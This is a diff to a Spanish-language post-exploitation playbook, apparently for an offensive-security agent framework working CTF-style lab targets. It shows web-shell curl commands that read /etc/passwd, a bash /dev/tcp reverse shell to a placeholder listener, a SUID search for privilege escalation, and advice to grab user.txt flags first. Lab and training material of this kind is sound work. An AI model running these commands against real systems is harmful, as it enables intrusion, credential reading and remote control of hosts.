@@ -101,10 +101,14 @@ curl -sS "http://<target>/uploads/shell.phtml?c=id"
 curl -sS "http://<target>/uploads/shell.phtml?c=cat%20/etc/passwd"
 ```
 
-Espera `uid=33(www-data)` o similar. Desde ahí, el siguiente paso es una reverse
-shell (`bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'` con un listener ya
-abierto) o directamente la escalada de privilegios con `nexus.post.privesc_hints`.
-Registra el acceso como hecho verificado con la salida de `id` como evidencia.
+Espera `uid=33(www-data)` o similar. **Loot primero**: con ese RCE ya puedes
+leer `cat /home/*/user.txt` (y `find / -name user.txt`), así que hazlo antes de
+cualquier otra cosa y regístralo como loot. Después escala: `find / -perm -4000`
+y la skill `privesc-suid` si aparece `systemctl`. Solo si necesitas un TTY,
+estabiliza con una reverse shell (`bash -c 'bash -i >& /dev/tcp/<lhost>/<lport>
+0>&1'` con `nexus.post.listener` ya abierto). No compiles ni transfieras
+binarios por el webshell: un comando por petición basta para SUID, sudo y `cat`.
+Registra el acceso con la salida de `id` como evidencia.
 
 ## 7. Errores comunes
 
